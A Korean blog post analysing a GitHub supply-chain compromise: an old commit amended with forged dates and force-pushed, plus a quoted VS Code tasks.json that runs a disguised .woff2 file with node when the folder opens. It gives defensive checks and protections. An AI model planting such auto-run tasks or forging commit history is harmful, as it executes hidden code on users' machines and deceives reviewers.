---
title: "3년 전 커밋이 지난여름에 수정됐다"
date: 2026-08-27 01:20:00 +0900
categories: ["CS", "보안"]
tags: ["git", "보안", "GitHub", "공급망"]
description: "예전에 참여했던 저장소가 침해됐다는 공지를 받고 직접 확인해봤습니다. 공격자는 새 커밋을 만들지 않고, 3년 전 커밋을 고쳐서 숨겼습니다."
---

메일을 한 통 받았습니다. 예전에 참여했던 그룹 프로젝트들이 모여 있는 조직에서
계정 탈취로 의심되는 활동이 있었고, 일부 저장소에 비정상적인 변경이 반영된 정황이
확인됐다는 내용이었습니다. 각자 자기 저장소를 확인하고 복구해달라는 요청이
붙어 있었습니다.

제 저장소는 `web34-moheyum` 입니다. 2022년 말에 넷이서 만든 마크다운 SNS 인데,
마지막으로 손댄 게 2023년 4월입니다. 3년 넘게 아무도 건드리지 않은 저장소라
설마 싶었습니다.

들어가서 커밋 목록을 봤습니다.

```
2023-04-07  48efe95  docs: email gif 변경
2022-12-18  470d3c0  Update README.md
2022-12-16  bb4fca1  Merge pull request #239 from ...
```

**아무 일도 없어 보였습니다.** 최근 커밋이 2023년 4월이고, 그 뒤로는 비어 있습니다.
여기서 넘어갔으면 그냥 안전한 줄 알았을 겁니다.

## 날짜가 맞지 않았다

저장소 정보를 API 로 조회해봤습니다.

```bash
gh api repos/<조직>/web34-moheyum --jq '.pushed_at'
```

```
2026-07-15T21:48:31Z
```

마지막 커밋은 2023년 4월인데, **마지막 push 는 2026년 7월**이었습니다.
공지에 적힌 공격 시점과 정확히 겹칩니다.

여기서 처음 알았습니다. git 의 커밋 날짜는 **그냥 커밋 안에 적힌 문자열**입니다.

```bash
GIT_AUTHOR_DATE="2023-04-07T08:25:57Z" \
GIT_COMMITTER_DATE="2023-04-07T08:25:57Z" \
git commit --amend --no-edit
```

이렇게 하면 오늘 만든 커밋이 2023년 것으로 보입니다. author 와 committer 둘 다
지정할 수 있어서, 흔히 아는 "author 날짜는 못 믿어도 committer 날짜는 믿을 수 있다"도
성립하지 않습니다.

**서버가 기록하는 `pushed_at` 만 위조할 수 없습니다.** 이건 커밋 내용이 아니라
GitHub 이 push 를 받은 시각을 따로 적어두는 값이기 때문입니다.

## 브랜치가 전부 같은 곳을 보고 있었다

이상해서 ref 를 전부 뽑아봤습니다.

```bash
gh api repos/<조직>/web34-moheyum/git/refs \
  --jq '.[] | select(.ref|startswith("refs/heads/")) | "\(.object.sha[:7])  \(.ref)"'
```

```
48efe95  refs/heads/main
48efe95  refs/heads/dev
48efe95  refs/heads/refactor/be/152
48efe95  refs/heads/refactor/be/187-test-code
48efe95  refs/heads/refactor/be/mail
48efe95  refs/heads/refactor/fe/236
48efe95  refs/heads/feature/cicd/12-production-deploy
```

브랜치 7개가 **전부 같은 커밋**을 가리키고 있었습니다. 기능 브랜치들이 각자 다른
지점에 있어야 정상인데, 하나로 눌려 있었습니다. 전 브랜치가 강제 push 로 덮인 겁니다.

## 진짜 변경은 문서 커밋 안에 있었다

`48efe95` 는 메시지가 `docs: email gif 변경` 입니다. README 의 이미지 주소를 바꾼,
누가 봐도 사소한 커밋입니다. 실제로 바뀐 파일을 봤습니다.

```
modified  +1/-1  README.md
modified  +4/-1  .gitignore
```

`.gitignore` 가 왜 여기서 바뀌지.

```diff
-.DS_Store
\ No newline at end of file
+.DS_Store
+temp_auto_push.bat
+temp_interactive_push.bat
+branch_structure.json
```

![조작된 커밋 화면. 2023년 4월 날짜와 문서 수정 메시지 아래에 .gitignore 변경이 들어 있다](/assets/img/posts/git-commit-forgery-diff.png)
_커밋 화면. 날짜도 메시지도 평범한데, 바뀐 파일에 `.gitignore` 가 끼어 있다_

공지에 적혀 있던, 공격에 사용된 것으로 의심되는 파일 이름 세 개였습니다.
**2023년에 쓴 문서 커밋이 2026년 공격 도구의 이름을 알 리가 없습니다.**

공격자는 새 커밋을 만들지 않았습니다. 기존의 멀쩡한 커밋을 `--amend` 로 고쳐서
자기 변경을 끼워 넣고, 날짜를 원래대로 맞춘 뒤 강제 push 했습니다.
커밋 목록만 보면 3년 동안 아무 일도 없던 저장소로 보입니다.

이 부분이 제일 무서웠습니다. **뭘 봐야 이상한 걸 알아챌 수 있는지조차 몰랐다는 것.**

## 왜 `.gitignore` 를 건드렸을까

그 세 줄 자체는 아무것도 실행하지 않습니다. `.gitignore` 는 git 이 무시할 파일
목록일 뿐입니다.

그래서 목적이 반대입니다. 공격자가 저장소 안에서 `temp_auto_push.bat` 같은 도구를
쓰는 동안, `git status` 에 그 파일들이 뜨지 않게 하려던 겁니다. **자기 흔적을
사람 눈에서 지우려고** 미리 깔아둔 셈입니다.

## 서명이 있었다면 달랐을까

캡처를 다시 보다가 하나 더 눈에 들어왔습니다.

![커밋 목록. 2022년 커밋들에는 Verified 배지가 있고 조작된 커밋에는 없다](/assets/img/posts/git-commit-forgery-history.png)
_2022년 커밋에는 `Verified` 가 붙어 있는데, 조작된 커밋에만 없다_

API 로 확인해보니 이렇습니다.

```
48efe95  verified=false  unsigned
470d3c0  verified=true   valid
bb4fca1  verified=true   valid
```

**서명된 커밋은 조용히 고칠 수 없습니다.** 커밋 내용이 바뀌면 서명이 깨지기 때문에,
남의 서명을 유지한 채로 내용만 바꾸는 건 불가능합니다. `Verified` 가 붙어 있던
커밋이 조작됐다면 배지가 사라져서 티가 납니다.

다만 이번 건에서 이게 결정적 증거는 못 됩니다. 문제의 커밋은 **원래부터 서명이
없었을 수도** 있기 때문입니다. 서명이 붙어 있던 2022년 커밋들은 GitHub 웹에서
만든 것(병합 커밋, 웹 에디터 수정)이라 자동으로 서명된 것이고, 로컬에서 만든
커밋은 GPG 설정을 하지 않으면 서명이 없습니다.

그래서 교훈은 이쪽입니다. **저장소의 커밋이 전부 서명돼 있으면, 하나만 서명이
없어도 바로 눈에 띕니다.** 섞여 있으면 그 신호가 죽습니다.

## 폴더를 여는 것만으로 실행된다

공지에는 더 위험한 항목이 있었습니다. 일부 저장소에서 이런 게 발견됐다고 합니다.

```json
// .vscode/tasks.json
{
  "tasks": [{
    "runOptions": { "runOn": "folderOpen" },
    "command": "node public/fonts/fa-solid-400.woff2"
  }]
}
```

```json
// .vscode/settings.json
{ "task.allowAutomaticTasks": true }
```

`runOn: "folderOpen"` 은 **VS Code 로 그 폴더를 여는 순간** 태스크를 실행합니다.
파일을 열지 않아도, 코드를 실행하지 않아도 됩니다. 폴더를 여는 것으로 끝입니다.

여기서 두 가지가 겹칩니다.

**하나.** clone 은 안전한데 **여는 게** 위험합니다. 보통은 반대로 생각합니다.
받아만 두고 안 돌리면 괜찮다고요. `folderOpen` 은 그 감각을 뒤집습니다.

**둘.** 실행 대상이 `.woff2` 입니다. 폰트 파일처럼 보이지만, **확장자는 그냥
파일 이름의 일부**입니다. `node` 에 넘기면 그 안에 뭐가 들었든 자바스크립트로
실행됩니다. 저장소에 폰트가 하나 늘어난 건 아무도 이상하게 보지 않습니다.

실제 폰트인지 확인하려면 앞 4바이트를 보면 됩니다.

```bash
gh api repos/<조직>/<저장소>/contents/path/to/font.woff2 --jq '.content' \
  | base64 -d | head -c 4 | xxd
```

```
00000000: 774f 4632    wOF2
```

`wOF2` 로 시작하면 정상 WOFF2 파일입니다. 자바스크립트처럼 보이면 아닙니다.

## clone 하지 않고 확인하기

이번에 저장소를 로컬에 받지 않고 전부 확인했습니다. API 로 읽기만 하면 실행될
일이 없습니다.

```bash
R=<조직>/<저장소>

# 마지막 push 시각 (위조 불가)
gh api "repos/$R" --jq '.pushed_at'

# 브랜치들이 같은 커밋을 보고 있는지
gh api "repos/$R/git/refs" --jq '.[] | "\(.object.sha[:7])  \(.ref)"'

# 최근 커밋이 실제로 뭘 바꿨는지
gh api "repos/$R/commits/<sha>" --jq '.files[] | "\(.status) \(.filename)"'

# 의심 파일 존재 여부
gh api "repos/$R/contents/.vscode/tasks.json" --silent && echo 있음 || echo 없음

# 설치할 때 자동 실행되는 스크립트가 있는지
gh api "repos/$R/contents/package.json" --jq '.content' | base64 -d \
  | grep -E '"(pre|post)?install"'
```

제 저장소에서는 `.vscode` 도, 가짜 폰트도, `preinstall` 도 나오지 않았습니다.
`.gitignore` 세 줄이 전부였습니다.

## 고친 방법

히스토리를 강제로 지우는 대신, **위에 정정 커밋을 얹었습니다.**

```bash
# clone 없이 파일 하나만 원래대로 되돌리기
gh api -X PUT "repos/$R/contents/.gitignore" \
  -f message="fix: 무단 변경으로 추가된 .gitignore 항목 제거" \
  -f content="$(printf '.vscode\n.secrets\n...\n' | base64 -w0)" \
  -f sha="$(gh api "repos/$R/contents/.gitignore" --jq '.sha')" \
  -f branch=main
```

히스토리를 지우면 깨끗해 보이지만, **무슨 일이 있었는지도 같이 사라집니다.**
나중에 확인할 사람을 생각하면 기록이 남는 편이 낫다고 봤습니다.

되돌리지 못한 것도 있습니다. 브랜치 6개가 원래 어디를 가리켰는지는 복구할 수
없었습니다. 그 SHA 를 아는 사람이 아무도 없습니다. 다행히 전부 병합된 브랜치라
코드는 main 에 남아 있고, 잃은 건 위치 정보뿐입니다.

## 그래서 뭘 켜둬야 할까

이번 일이 몇 달 동안 안 들킨 건 누가 게을러서가 아닙니다. **git 이 원래
알려주지 않기 때문**입니다. 강제 push 는 정상 기능이고, 커밋 목록은 커밋에 적힌
날짜순으로 정렬되니 날짜를 옛날로 맞춰두면 목록 아래로 묻힙니다. 끝난 프로젝트는
아무도 watch 하지 않으니 알림이 갈 곳도 없습니다.

발견 경로가 "누군가 우연히 열어본다" 하나뿐이었던 겁니다. 그래서 **감지는 사람이
아니라 규칙이 해야 합니다.**

### 1. 끝난 저장소는 archive

효과가 제일 크고 비용이 0입니다. archive 하면 저장소가 읽기 전용이 되어
**push 자체가 거부됩니다.** 계정이 털려도 손댈 수 없습니다.

```bash
gh api -X PATCH repos/OWNER/REPO -F archived=true
```

몇 년 전에 끝나고 아무도 안 건드리는 저장소가 여러 개라면, 이것부터입니다.
다시 열려면 `archived=false` 로 되돌리면 됩니다.

### 2. 강제 push 와 미서명 커밋을 거부

Ruleset 으로 막습니다.

```bash
gh api -X POST repos/OWNER/REPO/rulesets --input - <<'JSON'
{
  "name": "protect-history",
  "target": "branch",
  "enforcement": "active",
  "conditions": { "ref_name": { "include": ["~ALL"], "exclude": [] } },
  "rules": [
    { "type": "non_fast_forward" },
    { "type": "required_signatures" }
  ]
}
JSON
```

- `non_fast_forward` — **강제 push 거부.** 브랜치를 통째로 덮는 짓이 불가능해집니다
- `required_signatures` — **서명 없는 커밋 거부.** 남의 커밋을 `--amend` 로 고쳐
  올리는 경로가 막힙니다

public 저장소면 무료 요금제에서도 됩니다.

### 3. 강제 push 알림

GitHub 이 보내는 push 웹훅에는 이런 필드가 들어 있습니다.

```json
{ "ref": "refs/heads/main", "forced": true, "before": "48efe95", "after": "..." }
```

**`forced: true` 만 걸러서 알림을 보내면 됩니다.** 코드 몇 줄이고 무료입니다.
게다가 `before` 에 **덮이기 전 커밋 SHA** 가 담겨 옵니다. 이번에 제가 브랜치
6개의 원래 위치를 못 되살렸는데, 이게 켜져 있었다면 그 값이 로그에 남아
있었을 겁니다.

### 4. 옛날 clone 이 증거다

이건 설정이 아니라 사실 하나입니다. **로컬 `.git` 은 원격이 바뀌어도 따라
바뀌지 않습니다.** 몇 년 전에 받아둔 폴더가 있다면, 거기 원본이 그대로 있습니다.

```bash
git fetch origin
git log --oneline origin/main..HEAD   # 내 로컬에만 있는 커밋
git log --oneline HEAD..origin/main   # 원격에만 있는 커밋
```

원격에 없던 게 내 쪽에 있거나 SHA 가 어긋나면, **로컬 쪽이 원본**입니다.
반대로 말하면 clone 을 갖고 있는 사람은 이 명령 두 줄로 조작 여부를 몇 초 만에
알 수 있습니다.

> 단, 앞에서 말한 `folderOpen` 때문에 **그 폴더를 편집기로 열지는 마세요.**
> 터미널에서 `git -C <경로> ...` 로만 확인합니다.
{: .prompt-warning }

### 조직 전체를 훑을 때

저장소가 많으면 하나씩 열어볼 수 없습니다. `pushed_at` 으로 한 번에 봅니다.

```bash
gh api "orgs/ORG/repos?per_page=100"   --jq '.[] | select(.pushed_at > "2026-06-01") | "\(.pushed_at[:10])  \(.name)"' | sort
```

**커밋 날짜가 아니라 `pushed_at` 으로 정렬하는 게 핵심입니다.** 앞에서 본 것처럼
커밋 날짜는 위조되지만 이건 안 됩니다.

## 남은 생각

기술적으로 대단한 공격은 아니었습니다. `--amend` 와 날짜 환경변수, 강제 push.
전부 git 이 원래 제공하는 기능입니다.

무서웠던 건 **그게 평범해 보였다는 점**입니다. 커밋 목록에는 3년 전 문서 수정
하나가 있을 뿐이었고, 저는 그 화면을 보고 넘어갈 뻔했습니다. 침해 여부를
확인하라는 메일을 받고 들어간 사람이, 화면상으로는 아무 문제를 못 찾는 상황.

정리하면 이렇습니다.

- **커밋 날짜는 증거가 아니다.** author 도 committer 도 지정할 수 있다. 서버가
  기록하는 `pushed_at` 만 믿을 수 있다.
- **커밋 메시지도 증거가 아니다.** `docs:` 라고 적힌 커밋이 `.gitignore` 를 고쳤다.
  메시지 말고 실제 diff 를 봐야 한다.
- **오래된 저장소일수록 위험하다.** 아무도 안 보기 때문에, 거기에 숨기면 오래 간다.
- **폴더를 여는 것도 실행이다.** clone 만 하고 안 열면 괜찮다는 감각은 틀렸다.
- **확장자는 이름일 뿐이다.** `.woff2` 라도 `node` 에 넘기면 코드다.
- **서명은 조작을 드러낸다.** 커밋 서명을 켜두면, 내용이 바뀔 때 `Verified` 가
  사라진다. 다만 저장소 전체가 서명돼 있어야 신호가 산다.
- **감지는 규칙이 해야 한다.** 사람이 하나씩 열어보는 건 저장소가 몇 개만 넘어가도
  안 된다. archive 와 ruleset 은 설정 한 줄이고 되돌릴 수 있다.

한동안 안 들여다본 저장소가 있다면, `pushed_at` 한 번 찍어보시기를 권합니다.
명령 하나면 됩니다.
